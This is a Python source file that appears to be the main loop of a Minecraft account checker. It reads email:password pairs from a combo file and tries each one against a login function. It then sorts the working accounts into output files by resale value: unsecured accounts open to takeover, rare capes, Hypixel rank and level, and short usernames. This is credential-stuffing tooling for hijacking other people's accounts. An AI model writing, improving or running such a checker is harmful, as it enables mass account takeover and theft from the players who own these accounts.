from account_checker import *
from cape_checker import *
from special_checker import *
from file_creator import *

create_files()
account_file_lines = open(BASIC_PATH + '\\accounts.txt').read().split('\n')
class Counter:
    valid = 0
    invalid = 0
    insecure = 0
    minecon = 0
    fivezig = 0
    optifine = 0
    labymod = 0
    liquidbounce = 0
    hypixelrank = 0
    hypixellevel = 0
    shortname = 0



hypixel_min_level = 1

for x in range(len(account_file_lines)):
    email_username = account_file_lines[x].split(':', 1)[0]
    password = account_file_lines[x].split(':', 1)[1]
    answer = account_login(email_username=email_username, password=password)

    if not str(answer).__contains__('Invalid credentials'):
        UUID = answer["availableProfiles"][0]["id"]
        USERNAME = answer["availableProfiles"][0]["name"]
        print('Valid Account ' + USERNAME)
        hpRank = hypixel_rank_check(USERNAME)
        hpLevel = hypixel_level_check(USERNAME)

        open(FOLDER_PATH + '\\working.txt', 'a').write(account_file_lines[x] + "\n")
        Counter.valid += 1

        if bool(answer["user"]["secured"]) is False:
            open(FOLDER_PATH + '\\insecure.txt', 'a').write(account_file_lines[x] + "\n")
            Counter.insecure += 1
            print('Insecure account')
        if minecon_cape_request(UUID) is True:
            open(FOLDER_PATH + '\\minecon.txt', 'a').write(account_file_lines[x] + "\n")
            Counter.minecon += 1
            print('Minecon-Cape')
        if five_zig_cape_request(UUID) is True:
            open(FOLDER_PATH + '\\5zig.txt', 'a').write(account_file_lines[x] + "\n")
            Counter.fivezig += 1
            print('5zig-Cape')
        if optifine_cape_request(USERNAME) is True:
            open(FOLDER_PATH + '\\optifine.txt', 'a').write(account_file_lines[x] + "\n")
            Counter.optifine += 1
            print('Optifine-Cape')
        if laby_mod_cape_request(UUID) is True:
            open(FOLDER_PATH + '\\labymod.txt', 'a').write(account_file_lines[x] + "\n")
            Counter.labymod += 1
            print('Labymod-Cape')
        if liquidbounce_cape_request(UUID) is True:
            open(FOLDER_PATH + '\\liquidbounce.txt', 'a').write(account_file_lines[x] + "\n")
            Counter.liquidbounce += 1
            print('LiquidBounce-Cape')
        if hpRank is not False:
            open(FOLDER_PATH + '\\hypixelRank.txt', 'a').write(account_file_lines[x] + ' Rank: ' + hpRank + "\n")
            Counter.hypixelrank += 1
            print('Hypixel Rank: ' + hpRank)
        if float(hpLevel) >= hypixel_min_level:
            open(FOLDER_PATH + '\\hypixelLevel.txt', 'a').write(account_file_lines[x] + ' Level: ' + hpLevel + "\n")
            Counter.hypixellevel += 1
            print('Hypixel Level: ' + hpLevel)
        
        if under_four_character_long(USERNAME) is True:
            open(FOLDER_PATH + '\\special_name.txt', 'a').write(account_file_lines[x] + "\n")
            Counter.shortname += 1
            print('Short name')
    else:
        print('Invalid Account')
        Counter.invalid += 1
    print('Progress: ' + str(x + 1) + '/' + str(len(account_file_lines)) + '\n' + '-'*30)


Counter_list = [str(Counter.valid) + ' Valid accounts',str(Counter.invalid) + ' Invalid accounts',
             str(Counter.insecure) + ' Insecure accounts',str(Counter.minecon) + ' Minecon-capes',
             str(Counter.fivezig) + ' 5zig-capes',str(Counter.optifine) + ' Optifine-capes',
             str(Counter.labymod) + ' Labymod-capes',str(Counter.liquidbounce) + ' LiquidBounce-capes',
             str(Counter.hypixelrank) + ' Hypixel-Rank accounts',str(Counter.hypixellevel) + ' Hypixel-Level accounts',
             str(Counter.shortname) + ' Short-name accounts']

print('\n\nResult:\n')

for x in range(len(Counter_list) - 0):
    print(Counter_list[x])

input()